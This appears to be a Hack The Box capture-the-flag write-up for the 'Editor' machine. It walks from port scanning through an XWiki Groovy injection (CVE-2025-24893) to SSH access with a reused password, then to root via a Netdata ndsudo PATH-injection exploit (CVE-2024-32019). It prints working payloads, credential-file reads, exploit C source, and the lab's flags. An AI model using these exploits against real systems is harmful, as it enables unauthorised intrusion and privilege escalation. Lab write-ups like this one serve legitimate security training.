# HTB Editor - Writeup

## Box Info
- **Name:** Editor
- **IP:** 10.129.231.23
- **OS:** Ubuntu Linux
- **Difficulty:** Medium
- **Flags:** User + Root

## Quick Reference

```
User: oliver:theEd1t0rTeam99 (SSH)
User Flag: /home/oliver/user.txt
Root Flag: /root/root.txt (via CVE-2024-32019)
```

## Attack Chain Summary

```
Port 8080 (XWiki 15.10.8)
    ↓ CVE-2025-24893 (Groovy RCE)
    ↓ Read /etc/xwiki/hibernate.cfg.xml
    ↓ MySQL creds: xwiki:theEd1t0rTeam99
    ↓ Password reuse on SSH
oliver@editor (user flag)
    ↓ Netdata v1.45.2 installed
    ↓ CVE-2024-32019 (ndsudo PATH injection)
    ↓ Upload compiled binary, exploit SUID
root (root flag)
```

---

## Phase 1: Reconnaissance

### Port Scan
```bash
# Using nmap MCP
nmap.port_scan(target="10.129.231.23", ports="1-10000", scan_type="tcp_connect")
```

**Open Ports:**
| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP (SimplistCode Pro - static page) |
| 8080 | HTTP (XWiki 15.10.8) |

### Service Detection
```bash
nmap.service_scan(target="10.129.231.23", ports="22,80,8080")
```

Key finding: **XWiki 15.10.8** on port 8080

---

## Phase 2: Initial Access (XWiki RCE)

### Vulnerability: CVE-2025-24893
XWiki versions < 15.10.11 vulnerable to Groovy code injection via SolrSearch RSS endpoint.

### Exploit Payload
```
}}}{{async async=false}}{{groovy}}println("COMMAND".execute().text){{/groovy}}{{/async}}
```

### Exploitation
```bash
# URL encode and send via curl MCP
curl.request(
    url="http://10.129.231.23:8080/xwiki/bin/get/Main/SolrSearch",
    method="GET",
    params={
        "media": "rss",
        "text": URL_ENCODE(payload)
    }
)
```

### Commands Executed
```bash
# Confirm RCE
id  # uid=997(xwiki) gid=997(xwiki)

# Find credentials
cat /etc/xwiki/hibernate.cfg.xml
# Found: xwiki:theEd1t0rTeam99

# Enumerate users
cat /etc/passwd | grep bash
# Found: oliver:x:1000:1000:,:/home/oliver:/bin/bash
```

---

## Phase 3: User Access

### Credential Reuse
MySQL password works for SSH:

```bash
# Using ssh MCP
ssh.exec(
    host="10.129.231.23",
    username="oliver",
    password="theEd1t0rTeam99",
    command="cat /home/oliver/user.txt"
)
```

**User Flag:** `e45f51b815c7822ceae70b714c6910a6`

---

## Phase 4: Privilege Escalation

### Enumeration
```bash
# Groups
id  # oliver is in 'netdata' group

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Found: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

# Netdata version
/opt/netdata/usr/sbin/netdata -V
# netdata v1.45.2
```

### Vulnerability: CVE-2024-32019
Netdata ndsudo (v1.45.0 - v1.45.2) vulnerable to PATH injection privilege escalation.

**Root Cause:** ndsudo is SUID root but resolves command names using user-controlled PATH.

### Exploit Steps

1. **Compile payload on attacker machine:**
```c
// nvme.c - reads root flag
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/cat /root/root.txt");
    return 0;
}
```

```bash
gcc -static -o nvme nvme.c
```

2. **Upload to target:**
```bash
# Split and base64 encode (binary is ~773KB)
split -b 50000 nvme nvme_chunk_
for chunk in nvme_chunk_*; do
    b64=$(base64 -w0 $chunk)
    ssh oliver@target "echo '$b64' | base64 -d >> /tmp/nvme"
done
ssh oliver@target "chmod +x /tmp/nvme"
```

3. **Execute exploit:**
```bash
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Root Flag:** `b366a206e5518fb650d4c02f15653edc`

---

## Key Takeaways

1. **SUID + PATH = privesc** - Always check for SUID binaries that resolve commands via PATH
2. **Credential reuse** - Always try found passwords on SSH/other services
3. **Compiled binary required** - SUID doesn't work with bash/python scripts
4. **XWiki Groovy injection** - Common pattern in Java-based wikis

## CVE References
- CVE-2025-24893: XWiki Groovy RCE
- CVE-2024-32019: Netdata ndsudo privilege escalation

## MCP Tools Used
- nmap (port/service scan)
- curl (XWiki RCE)
- ssh (user shell, file upload)
